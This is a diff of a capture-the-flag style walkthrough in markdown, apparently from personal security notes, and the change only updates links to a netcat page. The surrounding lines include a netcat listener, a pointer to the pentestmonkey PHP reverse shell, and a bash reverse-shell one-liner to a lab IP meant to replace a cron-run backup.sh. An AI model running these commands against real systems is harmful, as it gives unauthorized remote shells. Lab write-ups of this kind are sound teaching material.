@@ -200,7 +200,7 @@ The fact that we can see our duck in the browser means *the webserver is executi
 ### Reverse Shell
 Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.
 
-PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](cybersecurity/tools/netcat.md) is listening on the port.
+PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](cybersecurity/tools/scanning-enumeration/netcat.md) is listening on the port.
 ```bash
 nc -lvnp 44444
 listening on [any] 44444 ...
@@ -309,7 +309,7 @@ A simple script to achieve a shell using [bash](coding/languages/bash.md) is the
 
 bash -i >& /dev/tcp/10.0.2.4/44445 0>&1
 ```
-Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. *Before saving the file* make sure you have another instance of [netcat](cybersecurity/tools/netcat.md) up and listening to the correct port.
+Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. *Before saving the file* make sure you have another instance of [netcat](cybersecurity/tools/scanning-enumeration/netcat.md) up and listening to the correct port.
 
 Once you save the file, it should get executed w/i the next 2 minutes, and on your listener you should see:
 ```bash
